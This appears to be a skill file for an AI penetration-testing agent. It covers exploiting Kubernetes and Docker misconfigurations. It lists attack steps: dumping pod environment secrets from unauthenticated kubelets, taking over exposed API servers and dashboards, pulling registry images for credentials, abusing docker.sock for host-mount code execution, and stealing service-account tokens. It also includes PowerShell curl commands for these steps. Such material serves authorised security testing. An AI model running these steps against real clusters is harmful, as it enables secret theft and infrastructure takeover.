---
name: k8s-docker
description: Kubernetes & Docker misconfigs — exposed kube-apis, dashboard, insecure registries, RBAC abuse, secrets in images, docker.sock exposure. Use when the target runs Kubernetes (k8s headers, dashboard subdomain, /api, helm charts) or Docker.
category: cloud-infra
---

# Kubernetes & Docker Misconfig

## Detection
- Fingerprint: `kube-dashboard`, `dashboard.$D`, `k8s`, `node-pool`, `eks.` / `gke.` / `aks.` subdomains, `Kubernetes` in server headers, `/api/v1` responses, `/apis`, `/healthz`, `/metrics` on node IPs.
- Check `/.well-known/` or port 10250/6443/2375/10255 on internal-scope hosts.

## Exploitation
1. **Unauthenticated kubelet**: `curl $H:10250/pods` leaks pod specs (env secrets); `run` endpoint RCE.
2. **Exposed API server**: `$H:6443/api/v1` without auth → full cluster control.
3. **Dashboard exposed**: `$H/dashboard` — no auth or default creds → RCE via exec.
4. **Docker registry unauthenticated** (`/v2/_catalog`, `/v2/<image>/tags/list`) → pull images, extract secrets/creds.
5. **docker.sock**: LFI/SSRF to `/var/run/docker.sock` → `POST /containers/create` with host mount → RCE.
6. **Secrets in images**: `docker run --entrypoint cat IMAGE /run/secrets/*`; env dump.
7. **RBAC token**: mounted service-account token at `/var/run/secrets/kubernetes.io/serviceaccount/token` via RCE → kubectl escalate.

## Tool Commands (Windows)
```powershell
# kubelet pods
curl.exe -s -k "https://$H:10250/pods" | ConvertFrom-Json | ForEach-Object {$_.items.spec.containers.env}
# API server
curl.exe -s -k "https://$H:6443/api/v1"
# Docker registry
curl.exe -s "http://$H:5000/v2/_catalog"
# docker.sock SSRF probe (only works if socket exposed via SSRF/LFI)
# curl.exe -s --unix-socket /var/run/docker.sock http://localhost/containers/json  (Linux only)
```

## Verification & Evidence
- Show cluster/container-level access (pod list, secrets, registry contents, exec).
- Redact secrets; capture exact endpoint + auth state.